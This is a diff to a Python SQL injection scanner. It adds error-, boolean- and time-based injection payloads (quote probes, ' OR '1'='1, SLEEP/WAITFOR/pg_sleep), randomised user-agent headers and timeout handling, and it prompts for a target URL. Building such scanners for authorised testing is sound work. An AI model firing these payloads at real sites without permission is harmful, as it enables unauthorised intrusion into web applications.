@@ -1,6 +1,7 @@
 import requests
 import time
 import random
+import re
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin, urlparse
 import xml.etree.ElementTree as ET
@@ -22,13 +23,15 @@ class SQLIDetection:
 
         # Loops over the payloads
         for payload in self.payloads["error"]:
-            # Gets the response from the page with the payload
-            response = self.session.get(self.target_url + payload, headers=get_random_agent(), timeout=10)
-            # Loops over the signatures in the errors list
-            for signature in self.errors_sigatures:
-                # Checks if the signature is in the response text
-                if signature in response.text.lower():
-                    return f"[!] VULNERABLE: Error-based found with payload: {payload}"
+            try:
+                # Gets the response from the page with the payload
+                response = self.session.get(self.target_url + payload, headers=get_random_agent(), timeout=10)
+                # Loops over the signatures in the errors list
+                for signature in self.errors_sigatures:
+                    # Checks if the signature is in the response text
+                    if re.search(signature, response.text, re.IGNORECASE):
+                        return f"[!] VULNERABLE: Error-based found with payload: {payload} (Matched: {signature})"
+            except: continue
     
         # Returns none if nothing was found
         return None
@@ -39,16 +42,18 @@ class SQLIDetection:
         print("[*] Testing for Boolean-based SQLi...")
         # Loops over the payloads in the boolean payloads
         for payload in self.payloads["boolean"]:
-            # Stores the true and false response
-            res_true = self.session.get(self.target_url + payload["true"])
-            res_false = self.session.get(self.target_url + payload["false"])
-            
-            # If the "True" payload matches the baseline but "False" doesn't, it's vulnerable
-            if len(res_true.content) != len(res_false.content):
-                # Checks if the content is the same
-                if len(res_true.content) == len(self.baseline_content):
-                    # Returns the payload which was found
-                    return f"[!] VULNERABLE: Boolean-based found with {payload['true']}"
+            try:
+                # Stores the true and false response
+                res_true = self.session.get(self.target_url + payload["true"], headers=get_random_agent())
+                res_false = self.session.get(self.target_url + payload["false"], headers=get_random_agent())
+                
+                # If the "True" payload matches the baseline but "False" doesn't, it's vulnerable
+                if len(res_true.content) != len(res_false.content):
+                    # Checks if the content is the same
+                    if len(res_true.content) == len(self.baseline_content):
+                        # Returns the payload which was found
+                        return f"[!] VULNERABLE: Boolean-based found with {payload['true']}"
+            except: continue # Continues to the next iternation
         # Returns false
         return None
 
@@ -59,16 +64,19 @@ class SQLIDetection:
         
         # Loops over the payloads in the time payloads
         for payload in self.payloads["time"]:
-            # Records the starting time
-            start = time.time()
-            # Sends the request
-            self.session.get(self.target_url + payload)
-            # Calculates the duration
-            duration = time.time() - start
-            # Checks the duaration is more than five secomds
-            if duration >= 5:
-                # Returns which payload triggered
-                return f"[!] VULNERABLE: Time-based found with payload: {payload}"
+            try:
+                # Records the starting time
+                start = time.time()
+                # Sends the request
+                self.session.get(self.target_url + payload, headers=get_random_agent(), timeout=15)
+                # Calculates the duration
+                duration = time.time() - start
+                # Checks the duaration is more than five secomds
+                if duration >= 5:
+                    # Returns which payload triggered
+                    return f"[!] VULNERABLE: Time-based found with payload: {payload}"
+            except requests.exceptions.Timeout:
+                return f"[!] VULNERABLE: Time-based (Timeout triggered) with payload: {payload}"
         # Returns none
         return None
     
@@ -130,10 +138,30 @@ def get_errors_messages():
     return error_list
 
 def main():
+    # Payloads for initial detection
+    payloads = {
+        "error": ["'", "''", "\"", "`", "')"],
+        "boolean": [
+            {"true": " AND 1=1", "false": " AND 1=2"},
+            {"true": "' OR '1'='1", "false": "' OR '1'='2"}
+        ],
+        "time": ["' OR SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "') OR pg_sleep(5)--"]
+    }
+
+    # Gets the error messages
+    errors = get_errors_messages()
+
     # Allows the user to enter in a url to scan
-    url = input("Enter URL to scan (e.g., http://testphp.vulnweb.com/listproducts.php?cat=1): ")
+    url = input("Enter URL to scan (e.g., http://testphp.vulnweb.com/listproducts.php?cat=1): ").strip().lower()
+    
+    # CHecks if the url starts with http
+    if not url.startswith("http"):
+        # Outputs it is an invaild url
+        print("[!] Invalid URL.")
+        return
+    
     # Creates and runs the scanner
-    scanner = SQLIDetection(url)
+    scanner = SQLIDetection(url, payloads, errors)
     scanner.run()
 
 # Starts the program
